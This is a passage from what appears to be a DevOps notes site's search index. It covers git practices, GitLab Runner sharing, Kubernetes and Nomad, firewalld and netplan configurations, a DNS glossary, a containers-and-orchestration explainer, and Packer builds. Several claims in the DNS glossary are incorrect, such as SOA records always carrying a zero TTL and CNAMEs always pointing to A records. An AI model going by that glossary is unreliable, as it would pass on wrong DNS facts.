upon with the team.  </p> <p>Most commit styles compose of a tag and some sort of description.</p> <p>Example of a simple commit message template:</p> Text Only<pre><code>&lt;tag&gt;: &lt;subject&gt;\n&lt;body&gt;\n</code></pre> <p>Unified commit style allows the usage of git log in automated tasks such as automatically generating a changelog, programatically figuring out which version to set the tag as among others.</p>"},{"location":"content/devops/gitdos/#dont-commit-generated-files-and-dependencies-do-use-gitignore","title":"DON'T commit generated files and dependencies, DO use .gitignore","text":"<p>Many projects have dependencies and routines that generate some kind of output, cache, local config files or otherwise some generated files. Save repository size and use .gitignore file to specify files that should not be tracked and pushed to the repository. Dependency management should be done with a build/dependency tool tailor made for your project's software stack. Not to mention, dependencies will often prove to take the most space relative to the source code:</p> <p></p> <p>Benefits of using .gitignore:</p> <ul> <li>Keeps the repository organized  </li> <li>Keeps the repository size small</li> </ul>"},{"location":"content/devops/gitdos/#dont-commit-secrets","title":"DON'T commit secrets","text":"<p>This technically goes under the previous chapter, but is important enought to warrant a separate one.</p> <p>Config files and maybe even source code might need to contain secrets like passwords, API keys. But NEVER keep them there in plaintext even if your repository is private. There are many tools available for this, including:  </p> <ul> <li>GitLab Variables</li> <li>Your teams key/value store or secrets engine</li> </ul> <p>So use them, because remember - previous commits are etched into the git history so even if your commit over the commit that had secrets in it, the secrets will still always be readable from the git history.</p>"},{"location":"content/devops/gitdos/#dont-rewrite-git-history","title":"DON'T rewrite git history","text":"<p>This is of course an exception if you've pushed some secrets to your repository. However in your usual workflows you should ideally consider pushed commits etched in diamond for all eternity. If you later find out that you messed up, make new commits that fix the problems (possibly by revert, possibly by patching, etc).</p> <p>Yes, of course git allows you to rewrite public history, but it is problematic for everyone else that is working with the same repository and thus it is just not best practice to do so.</p> <p>If you need to rewrite history, then you should discuss it in depth with your collaborators.</p>"},{"location":"content/devops/gitdos/#do-use-code-review","title":"DO use code review","text":"<p>Use merge/pull requests where possible. Try not to merge into the main branch at your leisure as it may mess up others work. This goes double for repositories that use automated continous integration and deployment and triple for repositories that are used by a lot of people and quadtruple for repositories that are critical.</p> <p>Create a request at a team members name that is familiar with the repo so that they can provide a fresh perspective on the changes before mergin to main branch.</p>"},{"location":"content/devops/gitdos/#do-use-pre-commit","title":"DO use pre-commit","text":"<p>Git hook scripts are useful for identifying simple issues before submission to code review.</p> <p>Easiest example: it will automatically format codes when commiting.</p>"},{"location":"content/devops/gitdos/#do-use-cicd","title":"DO use CI/CD","text":"<p>CI/CD is a tool for software development using the continuous methodologies:</p> <ul> <li>Continuous Integration (CI)</li> <li>Continuous Delivery (CD)</li> <li>Continuous Deployment (CD)</li> </ul> <p>CI/CD is used to automatically build, test, deploy, and monitor your applications to catch bugs and errors early in the development cycle.</p> <p>Manually deploying applications is time consuming and error-prone. With CI/CD you can automate that to avoid errors and save time in the process.</p> <p>To use GitLab CI/CD, create a file called <code>.gitlab-ci.yml</code> and in there specify in YML the steps that the CI/CD should run.</p> <p>CI/CD steps are called pipelines that consist of stages that consist of tasks.</p> <p>So for example a \"deployment\" pipeline would consist of stages \"copy configuration files\", \"update to latest version\" and \"start application\". And each stage would have YML tasks that are very similar to Ansible in syntax.</p> <p>Each stage is executed by a docker container called Executor that is spawned by the Runner. After a stage is finished, the docker container for that Executor is destroyed.</p> <p>With GitLab CI/CD you have many powerful features for describing which conditions must be met for pipeline/stages/tasks to run. They may run in parallel or sequentially, on schedule, on commit or when a variable is set manually. The possibilities are almost endless and are all covered in the official Documentation: https://docs.gitlab.com/ee/ci/</p>"},{"location":"content/devops/gitlabrunnershare/","title":"Sharing Runners To Multiple GitLab groups/projects","text":"<p>For some Runners with specific functionality it is more cost effective to share the Runners to multiple projects as opposed to each team hosting their own Runner. But this specific functionality might need to be restricted and can not be available globally on a GitLab instance. The following will describe the process of sharing Runners to multiple projects.</p>"},{"location":"content/devops/gitlabrunnershare/#guide-to-sharing-runners","title":"Guide To Sharing Runners","text":"<ol> <li> <p>Create a new group for the Runner(s)</p> <p>Since any management operation to CI/CD settings (like accessing and enabling Runners) requires Maintainer level access create a new empty group with no ciritical codebases or credentials from where the Runners are shared from. This way there is no need to give Maintainer access to existing groups or projects which might contain sensitive information or critical code.</p> </li> <li> <p>Create a new empty project inside the group created in the previous step</p> <p>Runners can be registered to a GitLab group, however they are not able to be shared from one group to any other groups or projects. Runners registered to a GitLab group are locked to only that group.</p> </li> <li> <p>Register Runner(s) to the project created in the previous step</p> <p>Runners registered to a project (as opposed to a group) are able to be shared to other projects by members of the project that have Maintainer access.</p> <p>GitLab documentation for registering runners</p> </li> <li> <p>Unlock the Runner(s) from the project</p> <p>By default, Runners are locked to the project they were registered to. However they are different from group Runners in that they can be unlocked to be shared to other projects.</p> <ol> <li>On the left sidebar, select Settings &gt; CI/CD.</li> <li>Expand Runners</li> <li>Under Available specific runners section press the edit button on the Runner(s) that should be shared</li> <li>Untick the When a runner is locked, it cannot be assigned to other projects option</li> </ol> </li> <li> <p>Add members to the group created in the first step</p> <p>Members added to the group must have Maintainer access to be able to enable the Runners in other projects.</p> <p>For adding members it is possible to leverage GitLab's LDAP Synchronization. By creating a separate LDAP group for users that should have access to the Runners in the group's project(s) it is possible to conveniently control access to the Runners.</p> </li> <li> <p>Enable the Runner(s) on other projects</p> <p>Members of the group created in the first step, who wish to use the Runner(s) in their projects, need to have Maintainer access to the group and the group they wish to enable the Runner(s) in.</p> <ol> <li>Navigate to the project(s) you wish to share the Runner(s) to</li> <li>On the left sidebar, select Settings &gt; CI/CD</li> <li>Expand Runners</li> <li>Under Other available runners press Enable for this project on the Runner(s) you wish to enable</li> </ol> </li> </ol>"},{"location":"content/devops/gitlabrunnershare/#considerations","title":"Considerations","text":"<p>Giving Maintainer access to members of a GitLab group will give them considerable power to change things in the group and project.</p> <p>Even after locking down the permissions to be as strict as possible members with Maintainer access in a group can still do the following:</p> <ul> <li>Change project name and description</li> <li>Change URLs</li> <li>Change codebase (but this should be empty anyway)</li> <li>Full control over runner settings (!)</li> </ul> <p>Last point is most notable: any member could decide to remove or add Runners to the group's projects. Other members still have to explicitly enable each Runner they wish to use, but verifying which Runner(s) are maintained and recommended by the group's owners/admins inconvenient, but possible by comparing Runner IDs (to be verified if the IDs can be spoofed).</p> <p>One alternative would be to reverse the access flow by using a service account as the only one which has access to the Runner(s) project and which people invite to their projects with Maintainer access so that the service account can enable the Runners for them. But this would mean that the service account will have the same amount of power on all projects it is invited to.</p> <p>Even then if a Runner has been enabled in a project by a service account, anyone who has Maintainer level access to that project where the Runner is enabled can change settings of the all enabled Runners on the project, essentially giving power to break the Runner(s) for everyone.</p>"},{"location":"content/devops/kubernetes/","title":"Kubernetes","text":"<p>Info</p> <p>Kubernetes Docs | Cloud Native Landscape | Kubernetes Secrets threat model | Managing Kubernetes without losing your cool</p> <p>I often see a lot of skepticism and even hate towards Kubernetes. However the main problem with Kubernetes is not itself, but the hype around it. It's simply used and adopted in places without sufficient research/knowledge about what it does, what problems it solves and how to leverage and maintain it:</p> <p></p> <p>Since Kubernetes is/wants to be the end all be all of container orchestration and do EVERYTHING it can within reason, then that means anyone trying to get into it must more or less be familiar with every aspect of it.</p> <p>Simple overview of monolith apps, containerization and K8s</p> <p>Kubernetes does:</p> <ul> <li>service discovery and load balancing</li> <li>storage orchestration</li> <li>automated rollouts and rollbacks</li> <li>automatic bin packing</li> <li>self-healing</li> <li>secret and configuration management</li> </ul> <p>Kubernetes does not:</p> <ul> <li>deploy source code and does not build application (any cicd, gitops, ops flows must be figured out)</li> <li>provide application-level services (databases etc)</li> <li>dictate logging, monitoring, or alerting solutions (it has logging and monitoring, but at a very basic level)</li> <li>provide nor mandate a configuration language/system, it's declarative API may be targeted by arbitrary forms of declarative specifications (many different tools that can be used to declare kube resources with the kube API exist)</li> </ul> <p>HOWEVER all of the things that \"Kubernetes does not\" do can run ON Kubernetes, and/or can be accessed by applications running on Kubernetes through some mechanisms.</p>"},{"location":"content/devops/kubernetes/#usage","title":"Usage","text":"<p>This doc will probably not have very detailed examples because Kubernetes is in VERY active development so incompatible changes and non-working, broken examples and not-so-thorough documentation is surely to follow. Related to the last point: any documentation should have versions everywhere.</p>"},{"location":"content/devops/networking/","title":"Networking","text":""},{"location":"content/devops/networking/#firewalld","title":"Firewalld","text":"<p>Info</p> <p>Understanding Firewalld in Multi-Zone Configurations</p> <p>Note that on (RedHat/CentOS/Rocky/Alma/etc) hosts that only use NetworkManager, to apply an interface to a zone, it must also be done with <code>nmcli</code>, applying settings only via <code>firewall-cmd</code> will not work! Example: add via firewalld and then run <code>nmcli con mod eth0 connection.zone internal</code></p>"},{"location":"content/devops/networking/#precedence","title":"Precedence","text":"<p>Active zones fulfill two different roles. Zones with associated interface(s) act as interface zones, and zones with associated source(s) act as source zones (a zone could fulfill both roles). Firewalld handles a packet in the following order:</p> <ol> <li>The corresponding source zone. Zero or one such zones may exist. If the source zone deals with the packet because the packet satisfies a rich rule, the service is whitelisted, or the target is not default, we end here. Otherwise, we pass the packet on.</li> <li>The corresponding interface zone. Exactly one such zone will always exist. If the interface zone deals with the packet, we end here. Otherwise, we pass the packet on.</li> <li>The firewalld default action. Accept icmp packets and reject everything else.</li> </ol> <p>The take-away message is that source zones have precedence over interface zones. Therefore, the general design pattern for multi-zoned firewalld configurations is to create a privileged source zone to allow specific IP's elevated access to system services and a restrictive interface zone to limit the access of everyone else.</p>"},{"location":"content/devops/networking/#gateway-example","title":"Gateway example","text":"<p>Example firewalld config for gateway host:</p> Text Only<pre><code>firewalld_zones:\n  # Internal zone\n  - name: \"internal\"\n    short: \"Internal\"\n    description: \"Internal networks to route through the gateway.\"\n    # -A FORWARD -i eth0 -j ACCEPT\n    forward: true\n    # -A INPUT -i eth0 -j ACCEPT\n    target: \"ACCEPT\"\n    source:\n      - address: \"10.10.0.0/16\"\n    interface:\n      - name: \"eth0\"\n  # External zone\n  - name: \"external\"\n    short: \"External\"\n    description: \"WAN to route to from gateway.\"\n    # -A POSTROUTING -o eth1 -j MASQUERADE\n    masquerade: true\n    # -A FORWARD -i eth1 -o eth0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT\n    forward: true\n    interface:\n      - name: \"eth1\"\n    source:\n      - address: \"193.40.251.4/32\"\n      - address: \"193.40.244.192/27\"\n      - address: \"10.10.2.1/32\"\nfirewalld_config:\n  DefaultZone: \"external\"\nfirewalld_policies:\n  - name: \"internal-external\"\n    short: \"Internal to External\"\n    description: \"Internal to External policy for gateway routing\"\n    ingress-zone:\n      - name: \"internal\"\n    egress-zone:\n      - name: \"external\"\n    target: \"ACCEPT\"\n</code></pre>"},{"location":"content/devops/networking/#wireguard-vpn-example","title":"Wireguard VPN example","text":"<p>Example VPN example with Wireguard set up with wg0 iface:</p> Text Only<pre><code>firewalld_enabled: true\nfirewalld_service_state: started\nfirewalld_remove_unmanaged: false\nfirewalld_zones:\n  - name: \"public\"\n    short: \"Public\"\n    description: \"For use in untrusted public networks. You do not trust the other computers. Only selected incoming connections are accepted.\"\n    interface:\n      - name: \"enp3s0\" # Also needs to be added with network role (check host_vars) or nmcli\n    service:\n      - name: \"ssh\"\n    port:\n      - { port: \"51821\", protocol: \"udp\" } # VPN port\n    rule:\n      - source: # Needed to route to other hosts in VPN network\n          address: \"10.7.0.0/24\"\n        destination: \"not address=10.7.0.0/24\"\n        masquerade: true\n  - name: \"internal\"\n    short: \"Internal\"\n    description: \"For use on internal networks. You mostly trust the other computers. Only selected incoming connections are accepted.\"\n    interface:\n      - name: \"wg0\" # Also needs to be added via nmcli: nmcli con mod wg0 connection.zone internal\n    masquerade: true\n    service:\n      - name: \"ssh\"\n  - name: \"trusted\"\n    short: \"Trusted\"\n    description: \"All network connections in trusted sources are accepted.\"\n    target: \"ACCEPT\"\n    source:\n      - address: \"10.7.0.0/24\"\n</code></pre>"},{"location":"content/devops/networking/#netplan","title":"Netplan","text":"<p>Netplan will ignore ifaces that are not defined in the configuration, but will overwrite settings on ifaces which are defined in the configuration file.</p> <p>Note that changing bond parameters in netplan might need a reboot! It is possible to use a workaround similar to <code>ip link del dev bond0 &amp;&amp; netplan apply</code> but this still briefly disconnects the machine from the networks used by that bond!</p>"},{"location":"content/devops/networking/#symmetric-routing-for-vip","title":"Symmetric routing for VIP","text":"<p>Info</p> <p>How to use netplan to create two separate routing tables?</p> <p>In highly available setups, traffic sourced from certain IPs (e.g., floating VIPs from keepalived etc) may need to leave through a specific interface or gateway, separate from the default uplink. This ensures symmetric routing, correct NAT behavior, and avoids disrupting other nodes in the cluster.</p> Text Only<pre><code>network:\n  version: 2\n  ethernets:\n    eno1:\n      addresses: [172.21.24.113/24] # Internal IP\n      nameservers:\n        addresses: [172.21.24.10]\n      routes:\n        - to: default\n          via: 172.21.24.10 # Default route to central management node with internet route\n          metric: 100\n  bridges:\n    br-pubapi:\n      interfaces: [vlan2125]\n      addresses: [172.21.25.11/24]\n      routes:\n        - to: default\n          via: 172.21.25.254\n          table: 2\n        - to: 172.20.12.0/23\n          via: 172.21.25.254\n      routing-policy:\n        - from: 172.21.25.10\n          table: 2\n</code></pre> <p><code>table: 2</code> defines a dedicated routing table for traffic sourced from the VIP (<code>172.21.25.10</code>). Routes in this table ensure traffic leaves via the correct gateway (<code>br-pubapi -&gt; 172.21.25.254</code>). Backup nodes without the VIP will ignore this rule, leaving default routes intact.</p> <p>Equivalent <code>ip</code> commands (These commands only apply to the current runtime session; they are lost after reboot unless also added to your network config to be applied after reboot or to keepalived config for example):</p> Bash<pre><code>ip route add default via 172.21.25.254 dev br-pubapi table 2\nip rule add from 172.21.25.10 table 2 priority 32765\n</code></pre> <p>Verify:</p> Bash<pre><code>ip rule show\nip route show\nip rule show table 2\nip route show table 2\n</code></pre>"},{"location":"content/devops/networking/#dns","title":"DNS","text":"<p>The Domain Name System (DNS) is the phonebook of the internet. Humans access information online through domain names, like nytimes.com or espn.com because this is easier to remember a bunch of \"random\" numbers (IP addresses). But web browsers interact through IP addresses. So we have a middle man called DNS that translates domain names to IP addresses so browsers can load internet resources.</p> <p>Each device connected to the internet has a unique IP address which other machines use to find the device. DNS servers eliminate the need for humans to memorize IP addresses such as 192.168.1.1 (in IPv4), or more complex newer alphanumeric IP addresses such as 2400:cb00:2048:1::c629:d7a2 (in IPv6).</p> <p>Anyone that wants people to find and remember their website on the internet will need to set up DNS record(s).</p> <p>Info</p> <p>How DNS Works</p>"},{"location":"content/devops/networking/#glossary","title":"Glossary","text":"<p>A Record (aka Address Mapping Record, DNS host record) - The 'A' in A Record stands for 'address.' This is the most popular DNS record type. Its function? Connecting a website domain or subdomain names, such as  example.com or blog.example.com, to a numerical IPV4 address such as 127.0.0.1. Think of this as the home address of a website.</p> <p>AAAA Record - This behaves the same as the 'A' record but points the domain to an IPv6 address. The difference between IPv4 and IPv6 is the length of the IP address name from 32 bit to 128 bit consecutively. Because many domains use domain registrars, their nameservers have an IPv4 address, so an AAAA record is not present.</p> <p>CNAME Record - CNAME stands for \"canonical name\" and will always point one name used by a website to an A record.</p> <p>MX Record - A DNS 'mail exchange' (MX) record directs email to a mail server. The MX record indicates how email messages should be routed in accordance with the Simple Mail Transfer Protocol (SMTP, the standard protocol for all email). Like CNAME records, an MX record must always point to another domain.</p> <p>SRV record - A service record (SRV) is a specification of data in the Domain Name System defining the location (i.e., the port number) of servers for specified services (e.g., Minecraft). Think of this as 'plugging in' a service to a port. TXT Record - Provides the ability to associate other services, or sometimes a mail service, to a domain. This is to help humans using words recognize which server (or software) is using their system. It's possible to add many TXT records to describe other numerical ideas.</p> <p>CERT Record - The 'certificate record' stores any public-key certificates. CERT records give the party in control of the authoritative DNS server for a specified zone permission to accept the use of a public key for authenticating communication with the server.</p> <p>PTR record - This 'pointer' record converts an IP address into a domain name. It's known as a reverse DNS entry check to verify if a server matches the domain it claims to be from. It's an extra check used as a security measure.</p> <p>SOA record - This record stores important information about the DNS zone for a domain, including the person responsible for the entire zone. Each zone must have an SOA record, but it's unlikely you'll have to create an SOA record directly\u2014unless the responsible person is you. An interesting thing about SOA records is they are always distributed with a zero TTL to prohibit caching. This record cannot be adjusted or interfered with but is limited to traveling only to one server at a time.</p> <p>CAA record - As a domain name holder, this helps you specify which Certification Authorities (CAs) can issue certificates for your domain, avoiding that error message 'this site does not have a valid certificate.'</p> <p>ALIAS record - ALIAS is a hosting record which points one domain to another domain. Usually, a CNAME record takes priority over any other resource record for a given hostname and conflicts with such records as MX or TXT, and thus some services may be affected and will not work. Thus ALIAS (also known as a virtual host record) was introduced. It can coexist with other records which are created for the same hostname (like example.com).</p>"},{"location":"content/devops/nomad/","title":"Hashicorp Nomad","text":"<p>Info</p> <p>Nomad Homepage | Nomad Docs | Cloud Native Landscape</p> <p>Nomad is a flexible workload orchestrator that enables an organization to easily deploy and manage any containerized or legacy application using a single, unified workflow. Nomad can run a diverse workload of Docker, non-containerized, microservice, and batch applications.</p> <p>Nomad enables developers to use declarative infrastructure-as-code for deploying applications. Nomad uses bin packing to efficiently schedule jobs and optimize for resource utilization.</p> <p>Nomad is comparable to Kubernetes in that it can:</p> <ul> <li>deploy containers and legacy applications.</li> <li>simplify container deployment and management (health checking, timeouts, retries, zero downtime updates etc).</li> <li>scale easily by abstracting complexity of orchestrating microservices in multiple namespaces in multiple data centres in multiple regions.</li> </ul> <p>Differences between Nomad and Kubernetes are that Kubernetes tries to be more of a complete package, while Nomad does not provide:</p> <ul> <li>Secrets management (although technically Kubernetes does not have secrets management built in)</li> <li>Service discovery and service mesh</li> <li>Load balancing</li> <li>Configuration management</li> <li>Custom controllers</li> </ul> <p>Instead Nomad takes the approach of separating each aspect to a separate product that can be used together or alone depending on the use case. Kubernetes comes with batteries built in, while with Nomad you decide if you even need the batteries or if you want to build the batteries yourself.</p>"},{"location":"content/devops/orchestrationexplained/","title":"Orchestration Fundamentals Explained Simply","text":"<p>At some point, when I first started my path down the journey of DevOps and managing IT infrastructure at enterprise level, my team was tasked with deploying a containerized web app for storing documents. Catch being that no-one on the team knew anything about running containerized applications. But no problem!</p> <p>Working in IT is all about being able to new problems, so we'll learn on the job!</p> <p>Nothing wrong with this approach if given sufficient time, but when you're told to deploy in a month? That's when you dive right in and find yourself in the middle of all kinds of magical words like: microservices, service meshes, service-level fault isolation, interoperability, container orchestration, horizontal scalability, service observability and discovery etc. So in the end you're sitting there with fire and explosions going off all around saying \"we're learning on the job, this is fine!\"</p> <p>My goal here is to provide not a very technical, easy to understand overview of what it means to go from a standard monolithic all-batteries-included app running on bare metal host to an orchestrated containerized app following the microservice architecture. This is the overview I wish I got before I jumped into the fire described earlier.</p>"},{"location":"content/devops/orchestrationexplained/#meet-the-monolith","title":"Meet The Monolith","text":"<p>Let's set the stage: say that me and you work for some company. The company's motivation is to make more money, that means reducing operating costs which in itself means making the tasks of the employees easier and more efficient. That is to say that our goal is to make our jobs as easy and efficient as possible. At first, this company was still using faxes and all the accounting was done on paper. But we built this wonderful web app for storing the companies documents (called Document Webapp) so the company can stop renting a whole warehouse for storing and handling physical stacks of paper. For the Document Webapp there was no other product that fit our company so we coded it ourselves in your favorite programming language. We ended up with a single executable that we test on the Test Server and run on the Production Server. Both servers are identical and run the same OS (let's call it the OldOS 1), same everything to ensure that there are no surprises, because when the intern tried to run it on his laptop with a different OS he got a lot of weird errors.</p> <p>By building this Document Webapp we reduced the costs by making the tasks of the employees easier and more efficient. But now instead of all the people at the document warehouse, we are managing the Document Webapp. We don't have to do as much work as all the people handling the paper did combined, but it's a lot of work to manage the Document Webapp so we would like to make OUR jobs easier and more efficient, so let's see what we could do.</p> <p>Let's look at the Document Webapp in detail. Because it's a web app it is using our companies load balancers (also acting as reverse proxies) so users can access it from the internet, fortunately load balancers are separate from our app and are taken care for us. But we coded our own:</p> <ul> <li>Web front-end</li> <li>Document Database (to store our documents)</li> <li>Document Search (so clients can search for documents without scrolling through a list of them)</li> <li>Document Caching (so the documents are delivered efficiently to clients)</li> <li>Authentication System (to provide logins and private documents for clients)</li> <li>Web back-end (to tie all the previous systems together)</li> </ul> <p>And the components of the app run inside that one executable!</p> <p>When we want to run a new version the the Document Webapp here's our deployment process at this point:</p> <ol> <li>SSH into the Test server</li> <li>Stop the Document Webapp</li> <li>Clone and build the latest Document Webapp</li> <li>Update the system packages if needed</li> <li>Start the new Document Webapp</li> <li>Repeat the same in the Production Server</li> </ol> <p>Quite simple! But we can automate that, so we run the same steps with Ansible. Even better! Now our process looks like this:</p> <ol> <li>Update Ansible repository with the version of the Document Webapp and version of the system dependencies we want to deploy</li> <li>Ansible runs the following automatically on the Test server:<ol> <li>Stop the Document Webapp</li> <li>Clone and build the latest Document Webapp</li> <li>Update the system packages if needed</li> <li>Start the new Document Webapp</li> </ol> </li> <li>Repeat the same for Production Server</li> </ol> <p>By doing all this, manually or with Ansible, the application is tied to the host that we run it on and the hosts OS. That is to say, if the OS or the hardware of the host has issues then our app will also be affected. Transferring the app to a new host means adding a new host in Ansible with the same OS and letting Ansible configure it with our dependencies and the Document Webapp.</p>"},{"location":"content/devops/orchestrationexplained/#meet-the-container","title":"Meet The Container","text":"<p>Then one day, it turns out we need to upgrade all our servers' OS from OldOS 1 to OldOS 2 because the previous version is now no longer supported and does no longer get security patches. Remember when our intern tried to run the Document Webapp on his laptop with a different OS got a lot of weird errors? Well now we are facing the same problem, because the application is tied to the OS. But can we somehow isolate Document Webapp so that it is able to run on any machine? The answer is application containers!</p> <p>Containerization is having the operating system take features and properties normally considered global, and reduce them to private versions or limited access/resources as a means of restricting or isolating access to those resources. Note that it's not the same as running another virtual machine (VM). VMs isolate on the kernel level, containers isolate on the OS level. Furthermore, there is a difference between system containers and application containers. System containers take the place of VMs when there is no need to isolate on the kernel level, because they have less overhead because of not having to simulate the kernel. System containers are usually used as you would use a VM. However application containers are designed to only run a single process and only contain bare minimum of the OS dependencies that the said singular process needs. Application containers are designed to be treated as you would treat the executable without containerization. You're not supposed to remote into the container, run commands and install stuff in the container, they're not supposed to have their own IP address etc. If you need to modify the container, you stop the old one and launch a new one with the modified contents. To put it simply application containers are emphemeral and system containers (like VMs) are long-lasting.</p> <p>But we are storing documents on our app, how can it be ephemeral? We certainly do not want the data to be ephemeral, otherwise on each restart of the container we would lose our data! This is key point to understand: application containers need to be provided with a separate persistent storage that is not part of the container itself. Simplest solution is to mount a directory from the host into the container. So on each restart the container uses the same data directory and our data is long-lasting while our container is ephemeral!</p> <p>Going forward if I mention containers, I mean application containers not system containers.</p> <p>So we create our container image for our Document Webapp. After creating the container image and launching a container with that image we will have it running on the servers with OldOS 2 inside a container that runs the Document Webapp executable with only the bare minimum dependencies from OldOS 1. In fact if the intern tries to run the Document Webapp now, then using the container they will not have any problems with their OS! With the container we have isolated the app from the OS of the host we are running it on.</p> <p>Now our process looks like this:</p> <ol> <li>Update Ansible repository with the version of the Document Webapp container image we want to deploy</li> <li>Ansible runs the following automatically on the Test server:<ol> <li>Stop the old Document Webapp container</li> <li>Start the new Document Webapp container</li> </ol> </li> <li>Repeat the same for Production Server</li> </ol> <p>At this point the containerized app is still dependent on the host we are running it on though! If there are issues on the hosts OS then our app will not be affected (unless it's serious), but if the hardware of the host has issues then our app will still be affected.</p>"},{"location":"content/devops/orchestrationexplained/#meet-the-orchestrator","title":"Meet The Orchestrator","text":"<p>Then at some point the Test server dies and it becomes the center of attention because what if this were to happen to Production? Management and we want to make sure that this absolutely does not happen to the Production Server. We could run a couple more Production servers for high availability and have a load balancer in front of them. This is certainly a good solution, but adds management overhead since now we have to manage multiple servers. Since we are already using containers, let's use an orchestrator!</p> <p>With an orchestrator we can set up a number of hosts in a cluster and then specify how many instances should be running and how these instances should be running and the orchestrator will take care of everything. However this comes with some new challenges as now where the Document Webapp is running becomes dynamic. The orchestrator will decide on it's own where it wants to run it and where it is the most efficient.</p> <p>Where the services are running, which port they are running on will all be dynamic with an orchestrator. The dynamic nature of orchestrating means we have to adapt our thinking and infrastructure to handle everything being dynamic. This means figuring out how to:</p> <ul> <li>load balance and direct traffic to the services (often called ingress): how do we direct traffic to instance(s) of our service if we don't know the host it is running on?</li> <li>handle logging and aggregating logs for easier debugging: how do we know which instance had a problem, how do we know it was the orchestrator, where are all the logs located?</li> <li>manage TLS certificates: it is not possible or good practice to spam certificate requests for all nodes, how do we distribute them?</li> <li>cluster internal communication: if services are running on arbitrary ports, how can they communicate with each other?</li> <li>handle stateful storage: if the service can run on any host, how do we ensure it will always have the same data?</li> </ul> <p>These are non-trivial obstacles, but once solved the Document Webapp service(s) can be separated from the host(s) it is running on with an orchestrator. It will no longer matter where it is, the orchestrator will make sure the defined number of instances will be up if enough nodes in the cluster are alive. If one dies with a service running on it, the orchestrator will deploy a new instance on another host et voila, it's as easy as that!</p> <p>Now our process looks like this:</p> <ol> <li>Define to the orchestrator how Document Webapp should be run and how many instances should be deployed</li> <li>Orchestrator will compare current state to defined state and do the following:<ol> <li>Check version and do a rolling update if current is outdated</li> <li>Check how many instances are running, stops or starts new instances to match defined state</li> <li>Takes care of load balancing, storage, certs</li> <li>Reports health of defined services</li> </ol> </li> </ol> <p>The orchestrator will get us as close to true Infrastructure as Code as today's technology allows. At this point the containerized app is no longer dependent on any particular host(s) or any OS.</p>"},{"location":"content/devops/orchestrationexplained/#bonus-meet-the-microservices","title":"Bonus: Meet The Microservices","text":"<p>With orchestration as the last step we have surpassed the most critical and hardest parts of deploying the Document Webapp. However if we wish to give it a final cherry on top we should move to the modern microservices architecture.</p> <p>Before we looked how our app consisted of multiple components that are all part of one executable:</p> <ul> <li>Web front-end</li> <li>Document Database (to store our documents)</li> <li>Document Search (so clients can search for documents without scrolling through a list of them)</li> <li>Document Caching (so the documents are delivered efficiently to clients)</li> <li>Authentication System (to provide logins and private documents for clients)</li> <li>Web back-end (to tie all the previous systems together)</li> </ul> <p>If we update one of these components, we need to redeploy the whole app. To minimize downtime we should break these components apart into separate services. That way we can update and manage each of them separately. This has the added benefit of always being able to easily switch out the components provided that our application's interfaces were coded to support this instead of being stuck with the built-in solution for eternity.</p> <p>Breaking up applications comes with the drawback of having more complicated architecture. Designing components to be pluggable and dynamic will inherently be more complex and also complicates debugging, but it will provide the value of being very flexible as technologies change and evolve.</p>"},{"location":"content/devops/orchestrationexplained/#recap","title":"Recap","text":"<p>To put it very short:</p> <ul> <li>Containers separate service(s) from the host OS</li> <li>Orchestrators separate service(s) from hosts themselves</li> <li>Microservice architecture allows service's components to be more flexible in terms of managing and deployment</li> </ul>"},{"location":"content/devops/orchestrationexplained/#practical-examples","title":"Practical Examples","text":"<ul> <li>Enabling Microservices at Orbitz</li> <li>RedHat: What is containerization?</li> <li>Typical orchestrated app's architecture: InvenioRDM Infrastructure Architecture</li> <li>Pros and cons of monoliths: Scaling Monolithic Applications</li> </ul>"},{"location":"content/devops/packer/","title":"Hashicorp Packer","text":"<p>Info</p> <p>Packer Homepage | Packer Documentation | Packer QEMU Builder | Proxmox Builder (ISO) | jamlab-packer</p> <p>Packer is an open source tool for creating identical machine images for multiple platforms from a single source configuration. Packer is lightweight, runs on every major operating system, and is highly performant, creating machine images for multiple platforms in parallel. Packer does not replace configuration management like Chef, Puppet or Ansible. In fact, when building images, Packer is able to use tools like Chef, Puppet or Ansible to install software onto the image.</p> <p>A machine image is a single static unit that contains a pre-configured operating system and installed software which is used to quickly create new running machines. Machine image formats change for each platform.</p> <p>jamlab-packer: Packer configurations for building homelab images. This repository contains my configurations for images.</p>"},{"location":"content/devops/packer/#usage","title":"Usage","text":"<p>With the Proxmox Builder (ISO) it is possible to use a remote or local ISO file to create and configure a VM which can be converted into a template that can be used for super fast provisioning of VMs.</p>"},{"location":"content/devops/packer/#commands","title":"Commands","text":"<p>Install dependencies and modules:</p> Bash<pre><code>packer init -upgrade .\n</code></pre> <p>After configuring everything, building images is as easy as running a single command. <code>PACKER_LOG=1</code> is used to print detailed messages while building for easier debugging:</p> Bash<pre><code>PACKER_LOG=1 packer build debian11.pkr.hcl\n</code></pre> <p>With log output to a file:</p> Bash<pre><code>PACKER_LOG_PATH=\"packerlog.txt\" PACKER_LOG=1 packer build debian11.pkr.hcl\n</code></pre> <p>Where <code>debian11.pkr.hcl</code> is the configuration file that defines how to build the image. </p>"},{"location":"content/devops/packer/#variables","title":"Variables","text":"<p>Defining variables in HCL:</p> Terraform<pre><code>variable \"iso_checksum\" {\n  type    = string\n  default = \"e307d0e583b4a8f7e5b436f8413d4707dd4242b70aea61eb08591dc0378522f3\"\n}\n</code></pre> <p>Defined variables can be used like so:</p> Terraform<pre><code>iso_checksum = var.iso_checksum\n</code></pre> <p>Or also substituted into other strings:</p> Terraform<pre><code>iso_full_url = \"https://${var.iso_url}${var.iso_checksum}\"\n</code></pre>"},{"location":"content/devops/packer/#preseed","title":"Preseed","text":"<p>Preseeding provides a way to answer questions asked during the installation process without having to manually enter the answers while the installation is running. Read more about this method in the preseed documentation.</p> <p>With preseed I configure the bare minimum for the installation to work before the cloud-init takes over.</p>"},{"location":"content/devops/packer/#cloud-init","title":"Cloud-init","text":"<p>Cloud-init is used for initial machine configuration like creating users, installing packages, custom scripts or preseeding <code>authorized_keys</code> file for SSH authentication. Read more about this in cloud-init documentation.</p> <p>With cloud-init I reset the root password to something randomized, install necessary packages for Ansible to take over the configuration and initialize the script that checks if Ansible management is bootstrapped.</p>"},{"location":"content/devops/packerci/","title":"Automated OpenStack image builds with Packer and GitLab CI/CD","text":"<p>The following is documentation for how to automate building, uploading and sharing images in OpenStack projects with Packer, Qemu via GiLab CI/CD pipelines using inherited settings using extended playbooks from templates and yml achors.</p> <p>Requirements you need to replicate the following:</p> <ul> <li>Priviledged GitLab Runner with a tag: https://gitlab.cern.ch/gitlabci-examples/demo-privileged-runners</li> <li>GitLab docker-in-docker executor for the priviledged runner: 